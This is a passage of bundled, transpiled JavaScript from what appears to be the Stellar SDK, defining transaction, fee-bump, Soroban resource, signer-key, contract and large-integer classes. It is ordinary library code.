        return (V = X(V))in F ? Object.defineProperty(F, V, {
            value: K,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : F[V] = K,
        F
    }
    function X(F) {
        var V = Y(F, "string");
        return j(V) == "symbol" ? V : V + ""
    }
    function Y(F, V) {
        if (j(F) != "object" || !F)
            return F;
        var K = F[Symbol.toPrimitive];
        if (K !== void 0) {
            var Q = K.call(F, V);
            if (j(Q) != "object")
                return Q;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(F)
    }
    return sorobandata_builder.SorobanDataBuilder = function() {
        function F(V) {
            O(this, F),
            b(this, "_data", void 0);
            var K;
            V ? typeof V == "string" || ArrayBuffer.isView(V) ? K = F.fromXDR(V) : K = F.fromXDR(V.toXDR()) : K = new _.default.SorobanTransactionData({
                resources: new _.default.SorobanResources({
                    footprint: new _.default.LedgerFootprint({
                        readOnly: [],
                        readWrite: []
                    }),
                    instructions: 0,
                    readBytes: 0,
                    writeBytes: 0
                }),
                ext: new _.default.ExtensionPoint(0),
                resourceFee: new _.default.Int64(0)
            }),
            this._data = K
        }
        return w(F, [{
            key: "setResourceFee",
            value: function(K) {
                return this._data.resourceFee(new _.default.Int64(K)),
                this
            }
        }, {
            key: "setResources",
            value: function(K, Q, ee) {
                return this._data.resources().instructions(K),
                this._data.resources().readBytes(Q),
                this._data.resources().writeBytes(ee),
                this
            }
        }, {
            key: "appendFootprint",
            value: function(K, Q) {
                return this.setFootprint(this.getReadOnly().concat(K), this.getReadWrite().concat(Q))
            }
        }, {
            key: "setFootprint",
            value: function(K, Q) {
                return K !== null && this.setReadOnly(K),
                Q !== null && this.setReadWrite(Q),
                this
            }
        }, {
            key: "setReadOnly",
            value: function(K) {
                return this._data.resources().footprint().readOnly(K ?? []),
                this
            }
        }, {
            key: "setReadWrite",
            value: function(K) {
                return this._data.resources().footprint().readWrite(K ?? []),
                this
            }
        }, {
            key: "build",
            value: function() {
                return _.default.SorobanTransactionData.fromXDR(this._data.toXDR())
            }
        }, {
            key: "getReadOnly",
            value: function() {
                return this.getFootprint().readOnly()
            }
        }, {
            key: "getReadWrite",
            value: function() {
                return this.getFootprint().readWrite()
            }
        }, {
            key: "getFootprint",
            value: function() {
                return this._data.resources().footprint()
            }
        }], [{
            key: "fromXDR",
            value: function(K) {
                return _.default.SorobanTransactionData.fromXDR(K, typeof K == "string" ? "base64" : "raw")
            }
        }])
    }(),
    sorobandata_builder
}
var signerkey = {}, hasRequiredSignerkey;
function requireSignerkey() {
    if (hasRequiredSignerkey)
        return signerkey;
    hasRequiredSignerkey = 1,
    Object.defineProperty(signerkey, "__esModule", {
        value: !0
    }),
    signerkey.SignerKey = void 0;
    var _ = j(requireXdr())
      , M = requireStrkey();
    function j(F) {
        return F && F.__esModule ? F : {
            default: F
        }
    }
    function O(F) {
        "@babel/helpers - typeof";
        return O = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(V) {
            return typeof V
        }
        : function(V) {
            return V && typeof Symbol == "function" && V.constructor === Symbol && V !== Symbol.prototype ? "symbol" : typeof V
        }
        ,
        O(F)
    }
    function x(F, V) {
        if (!(F instanceof V))
            throw new TypeError("Cannot call a class as a function")
    }
    function w(F, V) {
        for (var K = 0; K < V.length; K++) {
            var Q = V[K];
            Q.enumerable = Q.enumerable || !1,
            Q.configurable = !0,
            "value"in Q && (Q.writable = !0),
            Object.defineProperty(F, X(Q.key), Q)
        }
    }
    function b(F, V, K) {
        return K && w(F, K),
        Object.defineProperty(F, "prototype", {
            writable: !1
        }),
        F
    }
    function X(F) {
        var V = Y(F, "string");
        return O(V) == "symbol" ? V : V + ""
    }
    function Y(F, V) {
        if (O(F) != "object" || !F)
            return F;
        var K = F[Symbol.toPrimitive];
        if (K !== void 0) {
            var Q = K.call(F, V);
            if (O(Q) != "object")
                return Q;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(F)
    }
    return signerkey.SignerKey = function() {
        function F() {
            x(this, F)
        }
        return b(F, null, [{
            key: "decodeAddress",
            value: function(K) {
                var Q = {
                    ed25519PublicKey: _.default.SignerKey.signerKeyTypeEd25519,
                    preAuthTx: _.default.SignerKey.signerKeyTypePreAuthTx,
                    sha256Hash: _.default.SignerKey.signerKeyTypeHashX,
                    signedPayload: _.default.SignerKey.signerKeyTypeEd25519SignedPayload
                }
                  , ee = M.StrKey.getVersionByteForPrefix(K)
                  , ae = Q[ee];
                if (!ae)
                    throw new Error("invalid signer key type (".concat(ee, ")"));
                var ne = (0,
                M.decodeCheck)(ee, K);
                switch (ee) {
                case "signedPayload":
                    return ae(new _.default.SignerKeyEd25519SignedPayload({
                        ed25519: ne.slice(0, 32),
                        payload: ne.slice(36)
                    }));
                case "ed25519PublicKey":
                case "preAuthTx":
                case "sha256Hash":
                default:
                    return ae(ne)
                }
            }
        }, {
            key: "encodeSignerKey",
            value: function(K) {
                var Q, ee;
                switch (K.switch()) {
                case _.default.SignerKeyType.signerKeyTypeEd25519():
                    Q = "ed25519PublicKey",
                    ee = K.value();
                    break;
                case _.default.SignerKeyType.signerKeyTypePreAuthTx():
                    Q = "preAuthTx",
                    ee = K.value();
                    break;
                case _.default.SignerKeyType.signerKeyTypeHashX():
                    Q = "sha256Hash",
                    ee = K.value();
                    break;
                case _.default.SignerKeyType.signerKeyTypeEd25519SignedPayload():
                    Q = "signedPayload",
                    ee = K.ed25519SignedPayload().toXDR("raw");
                    break;
                default:
                    throw new Error("invalid SignerKey (type: ".concat(K.switch(), ")"))
                }
                return (0,
                M.encodeCheck)(Q, ee)
            }
        }])
    }(),
    signerkey
}
var hasRequiredTransaction_builder;
function requireTransaction_builder() {
    if (hasRequiredTransaction_builder)
        return transaction_builder;
    hasRequiredTransaction_builder = 1,
    Object.defineProperty(transaction_builder, "__esModule", {
        value: !0
    }),
    transaction_builder.TransactionBuilder = transaction_builder.TimeoutInfinite = transaction_builder.BASE_FEE = void 0,
    transaction_builder.isValidDate = L;
    var _ = requireXdr$1()
      , M = Q(requireBignumber())
      , j = Q(requireXdr())
      , O = requireAccount()
      , x = requireMuxed_account()
      , w = requireDecode_encode_muxed_account()
      , b = requireTransaction()
      , X = requireFee_bump_transaction()
      , Y = requireSorobandata_builder()
      , F = requireStrkey()
      , V = requireSignerkey()
      , K = requireMemo();
    function Q(U) {
        return U && U.__esModule ? U : {
            default: U
        }
    }
    function ee(U) {
        "@babel/helpers - typeof";
        return ee = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(Z) {
            return typeof Z
        }
        : function(Z) {
            return Z && typeof Symbol == "function" && Z.constructor === Symbol && Z !== Symbol.prototype ? "symbol" : typeof Z
        }
        ,
        ee(U)
    }
    function ae(U) {
        return fe(U) || ue(U) || oe(U) || ne()
    }
    function ne() {
        throw new TypeError(`Invalid attempt to spread non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
    }
    function oe(U, Z) {
        if (U) {
            if (typeof U == "string")
                return he(U, Z);
            var te = {}.toString.call(U).slice(8, -1);
            return te === "Object" && U.constructor && (te = U.constructor.name),
            te === "Map" || te === "Set" ? Array.from(U) : te === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(te) ? he(U, Z) : void 0
        }
    }
    function ue(U) {
        if (typeof Symbol < "u" && U[Symbol.iterator] != null || U["@@iterator"] != null)
            return Array.from(U)
    }
    function fe(U) {
        if (Array.isArray(U))
            return he(U)
    }
    function he(U, Z) {
        (Z == null || Z > U.length) && (Z = U.length);
        for (var te = 0, se = Array(Z); te < Z; te++)
            se[te] = U[te];
        return se
    }
    function pe(U, Z) {
        var te = Object.keys(U);
        if (Object.getOwnPropertySymbols) {
            var se = Object.getOwnPropertySymbols(U);
            Z && (se = se.filter(function(de) {
                return Object.getOwnPropertyDescriptor(U, de).enumerable
            })),
            te.push.apply(te, se)
        }
        return te
    }
    function ye(U) {
        for (var Z = 1; Z < arguments.length; Z++) {
            var te = arguments[Z] != null ? arguments[Z] : {};
            Z % 2 ? pe(Object(te), !0).forEach(function(se) {
                be(U, se, te[se])
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(U, Object.getOwnPropertyDescriptors(te)) : pe(Object(te)).forEach(function(se) {
                Object.defineProperty(U, se, Object.getOwnPropertyDescriptor(te, se))
            })
        }
        return U
    }
    function be(U, Z, te) {
        return (Z = Be(Z))in U ? Object.defineProperty(U, Z, {
            value: te,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : U[Z] = te,
        U
    }
    function xe(U, Z) {
        if (!(U instanceof Z))
            throw new TypeError("Cannot call a class as a function")
    }
    function Ae(U, Z) {
        for (var te = 0; te < Z.length; te++) {
            var se = Z[te];
            se.enumerable = se.enumerable || !1,
            se.configurable = !0,
            "value"in se && (se.writable = !0),
            Object.defineProperty(U, Be(se.key), se)
        }
    }
    function Ee(U, Z, te) {
        return Z && Ae(U.prototype, Z),
        te && Ae(U, te),
        Object.defineProperty(U, "prototype", {
            writable: !1
        }),
        U
    }
    function Be(U) {
        var Z = ce(U, "string");
        return ee(Z) == "symbol" ? Z : Z + ""
    }
    function ce(U, Z) {
        if (ee(U) != "object" || !U)
            return U;
        var te = U[Symbol.toPrimitive];
        if (te !== void 0) {
            var se = te.call(U, Z);
            if (ee(se) != "object")
                return se;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(U)
    }
    var q = transaction_builder.BASE_FEE = "100";
    transaction_builder.TimeoutInfinite = 0,
    transaction_builder.TransactionBuilder = function() {
        function U(Z) {
            var te = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
            if (xe(this, U),
            !Z)
                throw new Error("must specify source account for the transaction");
            if (te.fee === void 0)
                throw new Error("must specify fee for the transaction (in stroops)");
            this.source = Z,
            this.operations = [],
            this.baseFee = te.fee,
            this.timebounds = te.timebounds ? ye({}, te.timebounds) : null,
            this.ledgerbounds = te.ledgerbounds ? ye({}, te.ledgerbounds) : null,
            this.minAccountSequence = te.minAccountSequence || null,
            this.minAccountSequenceAge = te.minAccountSequenceAge || null,
            this.minAccountSequenceLedgerGap = te.minAccountSequenceLedgerGap || null,
            this.extraSigners = te.extraSigners ? ae(te.extraSigners) : null,
            this.memo = te.memo || K.Memo.none(),
            this.networkPassphrase = te.networkPassphrase || null,
            this.sorobanData = te.sorobanData ? new Y.SorobanDataBuilder(te.sorobanData).build() : null
        }
        return Ee(U, [{
            key: "addOperation",
            value: function(te) {
                return this.operations.push(te),
                this
            }
        }, {
            key: "addOperationAt",
            value: function(te, se) {
                return this.operations.splice(se, 0, te),
                this
            }
        }, {
            key: "clearOperations",
            value: function() {
                return this.operations = [],
                this
            }
        }, {
            key: "clearOperationAt",
            value: function(te) {
                return this.operations.splice(te, 1),
                this
            }
        }, {
            key: "addMemo",
            value: function(te) {
                return this.memo = te,
                this
            }
        }, {
            key: "setTimeout",
            value: function(te) {
                if (this.timebounds !== null && this.timebounds.maxTime > 0)
                    throw new Error("TimeBounds.max_time has been already set - setting timeout would overwrite it.");
                if (te < 0)
                    throw new Error("timeout cannot be negative");
                if (te > 0) {
                    var se = Math.floor(Date.now() / 1e3) + te;
                    this.timebounds === null ? this.timebounds = {
                        minTime: 0,
                        maxTime: se
                    } : this.timebounds = {
                        minTime: this.timebounds.minTime,
                        maxTime: se
                    }
                } else
                    this.timebounds = {
                        minTime: 0,
                        maxTime: 0
                    };
                return this
            }
        }, {
            key: "setTimebounds",
            value: function(te, se) {
                if (typeof te == "number" && (te = new Date(te * 1e3)),
                typeof se == "number" && (se = new Date(se * 1e3)),
                this.timebounds !== null)
                    throw new Error("TimeBounds has been already set - setting timebounds would overwrite it.");
                var de = Math.floor(te.valueOf() / 1e3)
                  , re = Math.floor(se.valueOf() / 1e3);
                if (de < 0)
                    throw new Error("min_time cannot be negative");
                if (re < 0)
                    throw new Error("max_time cannot be negative");
                if (re > 0 && de > re)
                    throw new Error("min_time cannot be greater than max_time");
                return this.timebounds = {
                    minTime: de,
                    maxTime: re
                },
                this
            }
        }, {
            key: "setLedgerbounds",
            value: function(te, se) {
                if (this.ledgerbounds !== null)
                    throw new Error("LedgerBounds has been already set - setting ledgerbounds would overwrite it.");
                if (te < 0)
                    throw new Error("min_ledger cannot be negative");
                if (se < 0)
                    throw new Error("max_ledger cannot be negative");
                if (se > 0 && te > se)
                    throw new Error("min_ledger cannot be greater than max_ledger");
                return this.ledgerbounds = {
                    minLedger: te,
                    maxLedger: se
                },
                this
            }
        }, {
            key: "setMinAccountSequence",
            value: function(te) {
                if (this.minAccountSequence !== null)
                    throw new Error("min_account_sequence has been already set - setting min_account_sequence would overwrite it.");
                return this.minAccountSequence = te,
                this
            }
        }, {
            key: "setMinAccountSequenceAge",
            value: function(te) {
                if (typeof te != "number")
                    throw new Error("min_account_sequence_age must be a number");
                if (this.minAccountSequenceAge !== null)
                    throw new Error("min_account_sequence_age has been already set - setting min_account_sequence_age would overwrite it.");
                if (te < 0)
                    throw new Error("min_account_sequence_age cannot be negative");
                return this.minAccountSequenceAge = te,
                this
            }
        }, {
            key: "setMinAccountSequenceLedgerGap",
            value: function(te) {
                if (this.minAccountSequenceLedgerGap !== null)
                    throw new Error("min_account_sequence_ledger_gap has been already set - setting min_account_sequence_ledger_gap would overwrite it.");
                if (te < 0)
                    throw new Error("min_account_sequence_ledger_gap cannot be negative");
                return this.minAccountSequenceLedgerGap = te,
                this
            }
        }, {
            key: "setExtraSigners",
            value: function(te) {
                if (!Array.isArray(te))
                    throw new Error("extra_signers must be an array of strings.");
                if (this.extraSigners !== null)
                    throw new Error("extra_signers has been already set - setting extra_signers would overwrite it.");
                if (te.length > 2)
                    throw new Error("extra_signers cannot be longer than 2 elements.");
                return this.extraSigners = ae(te),
                this
            }
        }, {
            key: "setNetworkPassphrase",
            value: function(te) {
                return this.networkPassphrase = te,
                this
            }
        }, {
            key: "setSorobanData",
            value: function(te) {
                return this.sorobanData = new Y.SorobanDataBuilder(te).build(),
                this
            }
        }, {
            key: "build",
            value: function() {
                var te = new M.default(this.source.sequenceNumber()).plus(1)
                  , se = new M.default(this.baseFee).times(this.operations.length).toNumber()
                  , de = {
                    fee: se,
                    seqNum: j.default.SequenceNumber.fromString(te.toString()),
                    memo: this.memo ? this.memo.toXDRObject() : null
                };
                if (this.timebounds === null || typeof this.timebounds.minTime > "u" || typeof this.timebounds.maxTime > "u")
                    throw new Error("TimeBounds has to be set or you must call setTimeout(TimeoutInfinite).");
                L(this.timebounds.minTime) && (this.timebounds.minTime = this.timebounds.minTime.getTime() / 1e3),
                L(this.timebounds.maxTime) && (this.timebounds.maxTime = this.timebounds.maxTime.getTime() / 1e3),
                this.timebounds.minTime = _.UnsignedHyper.fromString(this.timebounds.minTime.toString()),
                this.timebounds.maxTime = _.UnsignedHyper.fromString(this.timebounds.maxTime.toString());
                var re = new j.default.TimeBounds(this.timebounds);
                if (this.hasV2Preconditions()) {
                    var $ = null;
                    this.ledgerbounds !== null && ($ = new j.default.LedgerBounds(this.ledgerbounds));
                    var ie = this.minAccountSequence || "0";
                    ie = j.default.SequenceNumber.fromString(ie);
                    var ve = _.UnsignedHyper.fromString(this.minAccountSequenceAge !== null ? this.minAccountSequenceAge.toString() : "0")
                      , ge = this.minAccountSequenceLedgerGap || 0
                      , Re = this.extraSigners !== null ? this.extraSigners.map(V.SignerKey.decodeAddress) : [];
                    de.cond = j.default.Preconditions.precondV2(new j.default.PreconditionsV2({
                        timeBounds: re,
                        ledgerBounds: $,
                        minSeqNum: ie,
                        minSeqAge: ve,
                        minSeqLedgerGap: ge,
                        extraSigners: Re
                    }))
                } else
                    de.cond = j.default.Preconditions.precondTime(re);
                de.sourceAccount = (0,
                w.decodeAddressToMuxedAccount)(this.source.accountId()),
                this.sorobanData ? de.ext = new j.default.TransactionExt(1,this.sorobanData) : de.ext = new j.default.TransactionExt(0,j.default.Void);
                var Pe = new j.default.Transaction(de);
                Pe.operations(this.operations);
                var Ie = new j.default.TransactionEnvelope.envelopeTypeTx(new j.default.TransactionV1Envelope({
                    tx: Pe
                }))
                  , Te = new b.Transaction(Ie,this.networkPassphrase);
                return this.source.incrementSequenceNumber(),
                Te
            }
        }, {
            key: "hasV2Preconditions",
            value: function() {
                return this.ledgerbounds !== null || this.minAccountSequence !== null || this.minAccountSequenceAge !== null || this.minAccountSequenceLedgerGap !== null || this.extraSigners !== null && this.extraSigners.length > 0
            }
        }], [{
            key: "cloneFrom",
            value: function(te) {
                var se = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
                if (!(te instanceof b.Transaction))
                    throw new TypeError("expected a 'Transaction', got: ".concat(te));
                var de = (BigInt(te.sequence) - 1n).toString(), re;
                if (F.StrKey.isValidMed25519PublicKey(te.source))
                    re = x.MuxedAccount.fromAddress(te.source, de);
                else if (F.StrKey.isValidEd25519PublicKey(te.source))
                    re = new O.Account(te.source,de);
                else
                    throw new TypeError("unsupported tx source account: ".concat(te.source));
                var $ = parseInt(te.fee, 10) / te.operations.length
                  , ie = new U(re,ye({
                    fee: ($ || q).toString(),
                    memo: te.memo,
                    networkPassphrase: te.networkPassphrase,
                    timebounds: te.timeBounds,
                    ledgerbounds: te.ledgerBounds,
                    minAccountSequence: te.minAccountSequence,
                    minAccountSequenceAge: te.minAccountSequenceAge,
                    minAccountSequenceLedgerGap: te.minAccountSequenceLedgerGap,
                    extraSigners: te.extraSigners
                }, se));
                return te._tx.operations().forEach(function(ve) {
                    return ie.addOperation(ve)
                }),
                ie
            }
        }, {
            key: "buildFeeBumpTransaction",
            value: function(te, se, de, re) {
                var $ = de.operations.length
                  , ie = new M.default(de.fee).div($)
                  , ve = new M.default(se);
                if (ve.lt(ie))
                    throw new Error("Invalid baseFee, it should be at least ".concat(ie, " stroops."));
                var ge = new M.default(q);
                if (ve.lt(ge))
                    throw new Error("Invalid baseFee, it should be at least ".concat(ge, " stroops."));
                var Re = de.toEnvelope();
                if (Re.switch() === j.default.EnvelopeType.envelopeTypeTxV0()) {
                    var Pe = Re.v0().tx()
                      , Ie = new j.default.Transaction({
                        sourceAccount: new j.default.MuxedAccount.keyTypeEd25519(Pe.sourceAccountEd25519()),
                        fee: Pe.fee(),
                        seqNum: Pe.seqNum(),
                        cond: j.default.Preconditions.precondTime(Pe.timeBounds()),
                        memo: Pe.memo(),
                        operations: Pe.operations(),
                        ext: new j.default.TransactionExt(0)
                    });
                    Re = new j.default.TransactionEnvelope.envelopeTypeTx(new j.default.TransactionV1Envelope({
                        tx: Ie,
                        signatures: Re.v0().signatures()
                    }))
                }
                var Te;
                typeof te == "string" ? Te = (0,
                w.decodeAddressToMuxedAccount)(te) : Te = te.xdrMuxedAccount();
                var Le = new j.default.FeeBumpTransaction({
                    feeSource: Te,
                    fee: j.default.Int64.fromString(ve.times($ + 1).toString()),
                    innerTx: j.default.FeeBumpTransactionInnerTx.envelopeTypeTx(Re.v1()),
                    ext: new j.default.FeeBumpTransactionExt(0)
                })
                  , Ze = new j.default.FeeBumpTransactionEnvelope({
                    tx: Le,
                    signatures: []
                })
                  , $e = new j.default.TransactionEnvelope.envelopeTypeTxFeeBump(Ze);
                return new X.FeeBumpTransaction($e,re)
            }
        }, {
            key: "fromXDR",
            value: function(te, se) {
                return typeof te == "string" && (te = j.default.TransactionEnvelope.fromXDR(te, "base64")),
                te.switch() === j.default.EnvelopeType.envelopeTypeTxFeeBump() ? new X.FeeBumpTransaction(te,se) : new b.Transaction(te,se)
            }
        }])
    }();
    function L(U) {
        return U instanceof Date && !isNaN(U)
    }
    return transaction_builder
}
var network = {}, hasRequiredNetwork;
function requireNetwork() {
    return hasRequiredNetwork || (hasRequiredNetwork = 1,
    Object.defineProperty(network, "__esModule", {
        value: !0
    }),
    network.Networks = void 0,
    network.Networks = {
        PUBLIC: "Public Global Stellar Network ; September 2015",
        TESTNET: "Test SDF Network ; September 2015",
        FUTURENET: "Test SDF Future Network ; October 2022",
        SANDBOX: "Local Sandbox Stellar Network ; September 2022",
        STANDALONE: "Standalone Network ; February 2017"
    }),
    network
}
var soroban = {}, hasRequiredSoroban;
function requireSoroban() {
    if (hasRequiredSoroban)
        return soroban;
    hasRequiredSoroban = 1,
    Object.defineProperty(soroban, "__esModule", {
        value: !0
    }),
    soroban.Soroban = void 0;
    function _(Q) {
        "@babel/helpers - typeof";
        return _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ee) {
            return typeof ee
        }
        : function(ee) {
            return ee && typeof Symbol == "function" && ee.constructor === Symbol && ee !== Symbol.prototype ? "symbol" : typeof ee
        }
        ,
        _(Q)
    }
    function M(Q) {
        return b(Q) || w(Q) || O(Q) || j()
    }
    function j() {
        throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
    }
    function O(Q, ee) {
        if (Q) {
            if (typeof Q == "string")
                return x(Q, ee);
            var ae = {}.toString.call(Q).slice(8, -1);
            return ae === "Object" && Q.constructor && (ae = Q.constructor.name),
            ae === "Map" || ae === "Set" ? Array.from(Q) : ae === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(ae) ? x(Q, ee) : void 0
        }
    }
    function x(Q, ee) {
        (ee == null || ee > Q.length) && (ee = Q.length);
        for (var ae = 0, ne = Array(ee); ae < ee; ae++)
            ne[ae] = Q[ae];
        return ne
    }
    function w(Q) {
        if (typeof Symbol < "u" && Q[Symbol.iterator] != null || Q["@@iterator"] != null)
            return Array.from(Q)
    }
    function b(Q) {
        if (Array.isArray(Q))
            return Q
    }
    function X(Q, ee) {
        if (!(Q instanceof ee))
            throw new TypeError("Cannot call a class as a function")
    }
    function Y(Q, ee) {
        for (var ae = 0; ae < ee.length; ae++) {
            var ne = ee[ae];
            ne.enumerable = ne.enumerable || !1,
            ne.configurable = !0,
            "value"in ne && (ne.writable = !0),
            Object.defineProperty(Q, V(ne.key), ne)
        }
    }
    function F(Q, ee, ae) {
        return ae && Y(Q, ae),
        Object.defineProperty(Q, "prototype", {
            writable: !1
        }),
        Q
    }
    function V(Q) {
        var ee = K(Q, "string");
        return _(ee) == "symbol" ? ee : ee + ""
    }
    function K(Q, ee) {
        if (_(Q) != "object" || !Q)
            return Q;
        var ae = Q[Symbol.toPrimitive];
        if (ae !== void 0) {
            var ne = ae.call(Q, ee);
            if (_(ne) != "object")
                return ne;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(Q)
    }
    return soroban.Soroban = function() {
        function Q() {
            X(this, Q)
        }
        return F(Q, null, [{
            key: "formatTokenAmount",
            value: function(ae, ne) {
                if (ae.includes("."))
                    throw new TypeError("No decimals are allowed");
                var oe = ae;
                return ne > 0 && (ne > oe.length ? oe = ["0", oe.toString().padStart(ne, "0")].join(".") : oe = [oe.slice(0, -ne), oe.slice(-ne)].join(".")),
                oe.replace(/(\.\d*?)0+$/, "$1")
            }
        }, {
            key: "parseTokenAmount",
            value: function(ae, ne) {
                var oe, ue = ae.split(".").slice(), fe = M(ue), he = fe[0], pe = fe[1], ye = fe.slice(2);
                if (ye.length)
                    throw new Error("Invalid decimal value: ".concat(ae));
                var be = BigInt(he + ((oe = pe == null ? void 0 : pe.padEnd(ne, "0")) !== null && oe !== void 0 ? oe : "0".repeat(ne)));
                return be.toString()
            }
        }])
    }(),
    soroban
}
var contract = {}, hasRequiredContract;
function requireContract() {
    if (hasRequiredContract)
        return contract;
    hasRequiredContract = 1,
    Object.defineProperty(contract, "__esModule", {
        value: !0
    }),
    contract.Contract = void 0;
    var _ = requireAddress()
      , M = requireOperation()
      , j = x(requireXdr())
      , O = requireStrkey();
    function x(K) {
        return K && K.__esModule ? K : {
            default: K
        }
    }
    function w(K) {
        "@babel/helpers - typeof";
        return w = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(Q) {
            return typeof Q
        }
        : function(Q) {
            return Q && typeof Symbol == "function" && Q.constructor === Symbol && Q !== Symbol.prototype ? "symbol" : typeof Q
        }
        ,
        w(K)
    }
    function b(K, Q) {
        if (!(K instanceof Q))
            throw new TypeError("Cannot call a class as a function")
    }
    function X(K, Q) {
        for (var ee = 0; ee < Q.length; ee++) {
            var ae = Q[ee];
            ae.enumerable = ae.enumerable || !1,
            ae.configurable = !0,
            "value"in ae && (ae.writable = !0),
            Object.defineProperty(K, F(ae.key), ae)
        }
    }
    function Y(K, Q, ee) {
        return Q && X(K.prototype, Q),
        Object.defineProperty(K, "prototype", {
            writable: !1
        }),
        K
    }
    function F(K) {
        var Q = V(K, "string");
        return w(Q) == "symbol" ? Q : Q + ""
    }
    function V(K, Q) {
        if (w(K) != "object" || !K)
            return K;
        var ee = K[Symbol.toPrimitive];
        if (ee !== void 0) {
            var ae = ee.call(K, Q);
            if (w(ae) != "object")
                return ae;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(K)
    }
    return contract.Contract = function() {
        function K(Q) {
            b(this, K);
            try {
                this._id = O.StrKey.decodeContract(Q)
            } catch {
                throw new Error("Invalid contract ID: ".concat(Q))
            }
        }
        return Y(K, [{
            key: "contractId",
            value: function() {
                return O.StrKey.encodeContract(this._id)
            }
        }, {
            key: "toString",
            value: function() {
                return this.contractId()
            }
        }, {
            key: "address",
            value: function() {
                return _.Address.contract(this._id)
            }
        }, {
            key: "call",
            value: function(ee) {
                for (var ae = arguments.length, ne = new Array(ae > 1 ? ae - 1 : 0), oe = 1; oe < ae; oe++)
                    ne[oe - 1] = arguments[oe];
                return M.Operation.invokeContractFunction({
                    contract: this.address().toString(),
                    function: ee,
                    args: ne
                })
            }
        }, {
            key: "getFootprint",
            value: function() {
                return j.default.LedgerKey.contractData(new j.default.LedgerKeyContractData({
                    contract: this.address().toScAddress(),
                    key: j.default.ScVal.scvLedgerKeyContractInstance(),
                    durability: j.default.ContractDataDurability.persistent()
                }))
            }
        }])
    }(),
    contract
}
var numbers = {}, xdr_large_int = {}, uint128 = {}, hasRequiredUint128;
function requireUint128() {
    if (hasRequiredUint128)
        return uint128;
    hasRequiredUint128 = 1;
    function _(ne) {
        "@babel/helpers - typeof";
        return _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(oe) {
            return typeof oe
        }
        : function(oe) {
            return oe && typeof Symbol == "function" && oe.constructor === Symbol && oe !== Symbol.prototype ? "symbol" : typeof oe
        }
        ,
        _(ne)
    }
    Object.defineProperty(uint128, "__esModule", {
        value: !0
    }),
    uint128.Uint128 = void 0;
    var M = requireXdr$1();
    function j(ne, oe) {
        if (!(ne instanceof oe))
            throw new TypeError("Cannot call a class as a function")
    }
    function O(ne, oe) {
        for (var ue = 0; ue < oe.length; ue++) {
            var fe = oe[ue];
            fe.enumerable = fe.enumerable || !1,
            fe.configurable = !0,
            "value"in fe && (fe.writable = !0),
            Object.defineProperty(ne, w(fe.key), fe)
        }
    }
    function x(ne, oe, ue) {
        return oe && O(ne.prototype, oe),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        ne
    }
    function w(ne) {
        var oe = b(ne, "string");
        return _(oe) == "symbol" ? oe : oe + ""
    }
    function b(ne, oe) {
        if (_(ne) != "object" || !ne)
            return ne;
        var ue = ne[Symbol.toPrimitive];
        if (ue !== void 0) {
            var fe = ue.call(ne, oe);
            if (_(fe) != "object")
                return fe;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ne)
    }
    function X(ne, oe, ue) {
        return oe = K(oe),
        Y(ne, V() ? Reflect.construct(oe, ue || [], K(ne).constructor) : oe.apply(ne, ue))
    }
    function Y(ne, oe) {
        if (oe && (_(oe) == "object" || typeof oe == "function"))
            return oe;
        if (oe !== void 0)
            throw new TypeError("Derived constructors may only return object or undefined");
        return F(ne)
    }
    function F(ne) {
        if (ne === void 0)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return ne
    }
    function V() {
        try {
            var ne = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {}))
        } catch {}
        return (V = function() {
            return !!ne
        }
        )()
    }
    function K(ne) {
        return K = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(oe) {
            return oe.__proto__ || Object.getPrototypeOf(oe)
        }
        ,
        K(ne)
    }
    function Q(ne, oe) {
        if (typeof oe != "function" && oe !== null)
            throw new TypeError("Super expression must either be null or a function");
        ne.prototype = Object.create(oe && oe.prototype, {
            constructor: {
                value: ne,
                writable: !0,
                configurable: !0
            }
        }),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        oe && ee(ne, oe)
    }
    function ee(ne, oe) {
        return ee = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(ue, fe) {
            return ue.__proto__ = fe,
            ue
        }
        ,
        ee(ne, oe)
    }
    var ae = uint128.Uint128 = function(ne) {
        function oe() {
            j(this, oe);
            for (var ue = arguments.length, fe = new Array(ue), he = 0; he < ue; he++)
                fe[he] = arguments[he];
            return X(this, oe, [fe])
        }
        return Q(oe, ne),
        x(oe, [{
            key: "unsigned",
            get: function() {
                return !0
            }
        }, {
            key: "size",
            get: function() {
                return 128
            }
        }])
    }(M.LargeInt);
    return ae.defineIntBoundaries(),
    uint128
}
var uint256 = {}, hasRequiredUint256;
function requireUint256() {
    if (hasRequiredUint256)
        return uint256;
    hasRequiredUint256 = 1;
    function _(ne) {
        "@babel/helpers - typeof";
        return _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(oe) {
            return typeof oe
        }
        : function(oe) {
            return oe && typeof Symbol == "function" && oe.constructor === Symbol && oe !== Symbol.prototype ? "symbol" : typeof oe
        }
        ,
        _(ne)
    }
    Object.defineProperty(uint256, "__esModule", {
        value: !0
    }),
    uint256.Uint256 = void 0;
    var M = requireXdr$1();
    function j(ne, oe) {
